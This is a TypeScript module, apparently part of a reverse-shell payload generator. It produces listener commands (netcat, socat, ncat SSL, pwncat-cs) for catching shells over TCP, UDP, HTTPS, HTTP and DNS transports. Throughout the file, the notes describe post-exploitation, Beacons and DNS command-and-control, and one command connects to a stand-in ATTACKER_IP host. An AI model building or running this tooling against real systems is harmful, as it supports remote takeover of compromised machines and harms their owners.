import type { Transport, Language } from "@/lib/payloads/templates";

export type ListenerTool = "nc" | "socat" | "pwncat" | "openssl" | "ncat";

export interface ListenerCommand {
  tool: ListenerTool;
  command: string;
  notes: string;
  recommended?: boolean;
}

export interface PortStatus {
  port: number;
  inUse: boolean;
  protocol: "tcp" | "udp" | "both";
  process?: string;
}

export function buildListenerCommands(opts: {
  port: number;
  transport: Transport;
  language?: Language;
}): ListenerCommand[] {
  const { port, transport, language } = opts;
  const cmds: ListenerCommand[] = [];

  if (transport === "tcp") {
    cmds.push({
      tool: "nc",
      command: `nc -lvnp ${port}`,
      notes: "Standard netcat listener. -k for keep-alive across disconnects on some flavors.",
      recommended: true,
    });
    cmds.push({
      tool: "socat",
      command: `socat -d -d TCP-LISTEN:${port},reuseaddr,fork STDOUT`,
      notes: "socat. Better for multi-session / scripted handling.",
    });
    cmds.push({
      tool: "pwncat",
      command: `pwncat-cs -lp ${port}`,
      notes: "pwncat-cs. Full-featured post-exploitation framework. Auto-upgrades PTY, has upload/download.",
    });
    if (language === "powershell") {
      cmds.push({
        tool: "openssl",
        command: `openssl s_client -quiet -connect ATTACKER_IP:${port}`,
        notes: "For Windows HTTPS payloads. Replace with stunnel/socat TLS server.",
      });
    }
  } else if (transport === "udp") {
    cmds.push({
      tool: "nc",
      command: `nc -u -lvnp ${port}`,
      notes: "UDP listener. Many nc builds don't support -u with -l reliably; socat is preferred.",
    });
    cmds.push({
      tool: "socat",
      command: `socat -d -d UDP-LISTEN:${port},reuseaddr,fork STDOUT`,
      notes: "socat. Recommended for UDP. More reliable than nc -u.",
      recommended: true,
    });
  } else if (transport === "https") {
    cmds.push({
      tool: "openssl",
      command: `openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}`,
      notes: "TLS listener. Generate key/cert with: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 30 -nodes",
    });
    cmds.push({
      tool: "socat",
      command: `socat -d -d OPENSSL-LISTEN:${port},cert=cert.pem,key=key.pem,verify=0,fork STDOUT`,
      notes: "socat TLS listener. Recommended for HTTPS payloads.",
      recommended: true,
    });
    cmds.push({
      tool: "ncat",
      command: `ncat --ssl -lvnp ${port}`,
      notes: "ncat (Nmap) SSL listener. Easiest one-liner if you have ncat installed.",
    });
  } else if (transport === "http") {
    cmds.push({
      tool: "socat",
      command: `socat -d -d TCP-LISTEN:${port},reuseaddr,fork STDOUT`,
      notes: "HTTP-transport payloads still hit a TCP listener. Body is base64'd output.",
      recommended: true,
    });
    cmds.push({
      tool: "nc",
      command: `while true; do echo -e "HTTP/1.1 200 OK\\n\\n" | nc -lvnp ${port}; done`,
      notes: "Quick HTTP-aware listener loop. Use pwncat-cs http listener for real Beacons.",
    });
  } else if (transport === "dns") {
    cmds.push({
      tool: "socat",
      command: `socat -d -d UDP-LISTEN:${port},reuseaddr,fork STDOUT`,
      notes: "DNS-over-UDP listener. Real DNS C2 needs a dedicated tool (dnscat2 / iodine).",
      recommended: true,
    });
  }

  return cmds;
}

export function isPortAllowed(port: number): boolean {
  if (port <= 0 || port > 65535) return false;
  if (port < 1024) return false;
  const blocked = [22, 25, 53, 80, 110, 143, 443, 445, 3306, 5432, 6379, 8080, 8443, 9000, 9090, 27017];
  return !blocked.includes(port);
}
